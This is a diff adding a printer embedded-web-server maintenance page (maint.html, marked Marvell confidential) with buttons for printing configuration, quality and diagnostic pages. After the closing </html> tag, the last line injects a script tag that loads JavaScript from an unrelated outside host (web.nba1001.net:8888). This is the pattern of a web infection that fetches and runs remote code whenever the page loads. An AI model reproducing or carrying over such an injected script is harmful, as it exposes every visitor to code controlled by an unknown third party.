@@ -1,0 +1,160 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- 
+
+ maint.html
+
+ Maintanance Function Page for the Toolbox Configuration Function
+
+ ************************************************************
+   (c) Copyright 2008-2009 Marvell International Ltd.      
+  
+                 Marvell Confidential
+ *===========================================================
+
+ This file is intended only for the uses agreed to. 
+
+ You are hereby notified that any dissemination, distribution or copying of 
+ this material accept for the purposes agreed to is strictly prohibited.
+
+-->
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title id="pageTitle" ><!--#ssi IDs STRING_EWS_MAINTENANCE --></title>
+
+<script type="text/javascript">
+<!--
+var pageNav = function(theURL) {
+
+    window.open(theURL, "_self");
+    
+    return true;
+    
+};
+
+// function to show a customizable alert box
+var showAlert = function(left,top,title,message,isError) {
+
+    // body is defined in a javascript include file
+    
+}
+
+var maintFunction = function(theFunction) {
+
+    showAlert(200,100,"<!--#ssi IDs STRING_EWS_MAINTENANCE -->","<!--#ssi IDs STRING_EWS_CLIENT_SOFTWARE_INSTALL_WARNING -->",true);
+    return true;
+
+};
+
+// Provided for any necessary left navigation initialization
+var initializeLeftNav = function(myDoc) {
+
+   // Developer may override this function for special client services functions
+
+};
+
+// Provided for any necessary page initialization
+var initializePage = function() {
+
+   initializeLeftNav(document);
+   
+}
+
+//-->
+</script>
+
+<script type="text/javascript" src="/js/client-tools.js"></script>
+
+<!--#cspi IDm TOOLBOX_JS_MACRO -->
+
+<style type="text/css">
+<!--#ssi INCLUDE /toolbox.css -->
+</style>
+
+</head>
+
+<body onload="initializePage()">
+
+    <!--#ssi INCLUDE /leftNav.html -->
+    
+    <div class="heading1" id="topOfPageRow">
+        <span id="deviceModelLabel"><!--#ssi IDr OID_PLATFORM_PRINT_NAME_STRING --></span> 
+    </div> <!-- end of div 'topOfPageRow'  -->
+
+    <div id="pageBodyDiv">
+    
+        <div class="heading1" id="topPageHeadingDiv">
+            <span id="currentPageLabel" class="topPageLabel"><!--#ssi IDs STRING_EWS_MAINTENANCE --></span>
+        </div> <!-- end of div 'topPageHeadingDiv'  -->
+        
+        <div class="heading2" id="topPageLabelsDiv">
+            <span id="pageInstructions" ><!--#ssi IDs STRING_EWS_MAINTENANCE_NAV_LABEL --></span>
+        </div> <!-- end of div 'topPageLabelsDiv'  -->
+        
+        <div id="pageDialogDiv">
+
+            <div id="topPageHorizontalRule" >
+                <hr class="aRuleLine" />
+            </div>
+
+            <div id="maintDialogTable">
+ 
+                <div id="dialogLabels">
+
+                    <div class="dialogRowA"><input class="maintButton" type="submit" id="printConfigButton" value="<!--#ssi IDs STRING_EWS_MAINT_PRINT_CONFIG_BUTTON_LABEL -->"  onclick="javascript:maintFunction('printConfig');"/></div>
+                    <div class="dialogRowB"><span> &nbsp </span></div>
+                    <div class="dialogRowA"><input class="maintButton" type="submit" id="printQualityButton" value="<!--#ssi IDs STRING_EWS_MAINT_PRINT_QUALITY_BUTTON_LABEL -->"  onclick="javascript:maintFunction('printQuality');"/></div>
+                    <div class="dialogRowB"><span> &nbsp </span></div>
+                    <div class="dialogRowA"><input class="maintButton" type="submit" id="printDiagButton" value="<!--#ssi IDs STRING_EWS_MAINT_PRINT_DIAG_BUTTON_LABEL -->"  onclick="javascript:maintFunction('printDiag');"/></div>
+                    <div class="dialogRowB"><span> &nbsp </span></div>
+                    <div class="dialogRowA"><input class="maintButton" type="submit" id="viewManualButton" value="<!--#ssi IDs STRING_EWS_MAINT_VIEW_MANUAL_BUTTON_LABEL -->"  onclick="javascript:maintFunction('viewManual');"/></div>
+
+                </div> <!-- end of div 'dialogLabels'  -->
+
+                <div id="maintDialogFields">
+
+                    <div class="dialogRowA"><span id="printConfigButtonLabel" ><!--#ssi IDs STRING_EWS_PRINT_CONFIG_PAGE --></span></div> 
+                    <div class="dialogRowB"><span> &nbsp </span></div>
+                    <div class="dialogRowA"><span id="printQualityButtonLabel" ><!--#ssi IDs STRING_EWS_PRINT_QUALITY_PAGE --></span></div> 
+                    <div class="dialogRowB"><span> &nbsp </span></div>
+                    <div class="dialogRowA"><span id="printDiagButtonLabel" ><!--#ssi IDs STRING_EWS_PRINT_DIAGNOSTIC --></span></div> 
+                    <div class="dialogRowB"><span> &nbsp </span></div>
+                    <div class="dialogRowA"><span id="viewManualLabel" ><!--#ssi IDs STRING_EWS_ONLINE_MANUAL --></span></div>
+
+                </div> <!-- end of div 'maintDialogFields'  -->
+
+            </div> <!-- end of div 'maintDialogTable'  -->
+            
+            <div id="allButtonsDiv">
+                <div id="bottomPageHorizontalRule" >
+                    <hr class="aRuleLine" />
+                </div>
+                <div id="errorMessageDiv">
+                    <span id="errorMessage" > &nbsp </span>
+                </div>
+                <div id="refreshButtonCell"> 
+                    <input class="button" type="submit" id="refreshButton" value="<!--#ssi IDs STRING_EWS_REFRESH_BUTTON_LABEL -->" onclick="javascript:pageNav('/view/maint');"/>
+                </div>
+            </div> <!-- end of div 'allButtonsDiv'  -->
+        
+        </div>  <!-- end of div 'pageDialogDiv'  -->
+    
+        <!-- customizable alert message div -->
+        <div id="alertDiv" class="alert">
+            <b><span id="alertTitle"></span></b>
+            <p />
+            <span id="alertMessage"></span>
+            <form class="alertForm">
+            <input 
+               type="button" 
+               value="<!--#ssi IDs STRING_EWS_ALERT_OK_BUTTON_LABEL -->" 
+               style="width:75px;" 
+               onclick="document.getElementById('alertDiv').style.display='none'" />
+            <img id="alertImageID" class="alertImage" src="" alt=""/>
+            </form>
+        </div>
+
+    </div> <!-- end of div 'pageBodyDiv'  -->
+
+</body>
+</html>
+<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>
